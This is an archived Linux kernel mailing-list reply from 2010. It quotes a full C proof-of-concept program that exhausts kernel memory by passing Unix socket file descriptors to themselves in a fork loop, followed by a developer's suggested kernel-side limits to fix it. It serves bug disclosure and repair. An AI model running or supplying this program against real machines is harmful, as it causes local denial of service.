From: Eric Dumazet <eric.dumazet@gmail.com>
Subject: Re: Unix socket local DOS (OOM)
Date: Wed, 24 Nov 2010 00:11:58 +0100
Message-ID: <1290553918.2866.80.camel@edumazet-laptop>
References: <AANLkTi=Q967xpX0KLMwX-=_4_1AKO5wjHEuJ1TrNjCj9@mail.gmail.com>
Mime-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: QUOTED-PRINTABLE
Cc: LKML <linux-kernel@vger.kernel.org>,
	Andrew Morton <akpm@linux-foundation.org>,
	Eugene Teo <eugene@redhat.com>, netdev <netdev@vger.kernel.org>
To: Vegard Nossum <vegard.nossum@gmail.com>,
	David Miller <davem@davemloft.net>
Return-path: <netdev-owner@vger.kernel.org>
Received: from mail-ww0-f47.google.com ([74.125.82.47]:40579 "EHLO
	mail-ww0-f47.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
	with ESMTP id S1753777Ab0KWXMG (ORCPT
	<rfc822;netdev@vger.kernel.org>); Tue, 23 Nov 2010 18:12:06 -0500
In-Reply-To: <AANLkTi=Q967xpX0KLMwX-=_4_1AKO5wjHEuJ1TrNjCj9@mail.gmail.com>
Sender: netdev-owner@vger.kernel.org
List-ID: <netdev.vger.kernel.org>

Le mardi 23 novembre 2010 =C3=A0 23:21 +0100, Vegard Nossum a =C3=A9cri=
t :
> Hi,
>=20
> I found this program lying around on my laptop. It kills my box
> (2.6.35) instantly by consuming a lot of memory (allocated by the
> kernel, so the process doesn't get killed by the OOM killer). As far
> as I can tell, the memory isn't being freed when the program exits
> either. Maybe it will eventually get cleaned up the UNIX socket
> garbage collector thing, but in that case it doesn't get called
> quickly enough to save my machine at least.
>=20
> #include <sys/mount.h>
> #include <sys/socket.h>
> #include <sys/un.h>
> #include <sys/wait.h>
>=20
> #include <errno.h>
> #include <fcntl.h>
> #include <stdio.h>
> #include <stdlib.h>
> #include <string.h>
> #include <unistd.h>
>=20
> static int send_fd(int unix_fd, int fd)
> {
>         struct msghdr msgh;
>         struct cmsghdr *cmsg;
>         char buf[CMSG_SPACE(sizeof(fd))];
>=20
>         memset(&msgh, 0, sizeof(msgh));
>=20
>         memset(buf, 0, sizeof(buf));
>         msgh.msg_control =3D buf;
>         msgh.msg_controllen =3D sizeof(buf);
>=20
>         cmsg =3D CMSG_FIRSTHDR(&msgh);
>         cmsg->cmsg_len =3D CMSG_LEN(sizeof(fd));
>         cmsg->cmsg_level =3D SOL_SOCKET;
>         cmsg->cmsg_type =3D SCM_RIGHTS;
>=20
>         msgh.msg_controllen =3D cmsg->cmsg_len;
>=20
>         memcpy(CMSG_DATA(cmsg), &fd, sizeof(fd));
>         return sendmsg(unix_fd, &msgh, 0);
> }
>=20
> int main(int argc, char *argv[])
> {
>         while (1) {
>                 pid_t child;
>=20
>                 child =3D fork();
>                 if (child =3D=3D -1)
>                         exit(EXIT_FAILURE);
>=20
>                 if (child =3D=3D 0) {
>                         int fd[2];
>                         int i;
>=20
>                         if (socketpair(PF_UNIX, SOCK_SEQPACKET, 0, fd=
) =3D=3D -1)
>                                 goto out_error;
>=20
>                         for (i =3D 0; i < 100; ++i) {
>                                 if (send_fd(fd[0], fd[0]) =3D=3D -1)
>                                         goto out_error;
>=20
>                                 if (send_fd(fd[1], fd[1]) =3D=3D -1)
>                                         goto out_error;
>                         }
>=20
>                         close(fd[0]);
>                         close(fd[1]);
>                         goto out;
>=20
>                 out_error:
>                         fprintf(stderr, "error: %s\n", strerror(errno=
));
>                 out:
>                         exit(EXIT_SUCCESS);
>                 }
>=20
>                 while (1) {
>                         pid_t kid;
>                         int status;
>=20
>                         kid =3D wait(&status);
>                         if (kid =3D=3D -1) {
>                                 if (errno =3D=3D ECHILD)
>                                         break;
>                                 if (errno =3D=3D EINTR)
>                                         continue;
>=20
>                                 exit(EXIT_FAILURE);
>                         }
>=20
>                         if (WIFEXITED(status)) {
>                                 if (WEXITSTATUS(status))
>                                         exit(WEXITSTATUS(status));
>                                 break;
>                         }
>                 }
>         }
>=20
>         return EXIT_SUCCESS;
> }
>=20
>=20
> Vegard
> --

Hi Vegard

Do you have a patch to correct this problem ?

I suppose we should add a machine wide limit of pending struct
scm_fp_list. (percpu_counter I guess)

David, commit f8d570a4 added one "struct list_head list;" to struct
scm_fp_list, enlarging it by a two factor because of power of two
kmalloc() sizes.  (2048 bytes on 64bit arches instead of 1024
previously)

We might lower SCM_MAX_FD from 255 to 253 ?



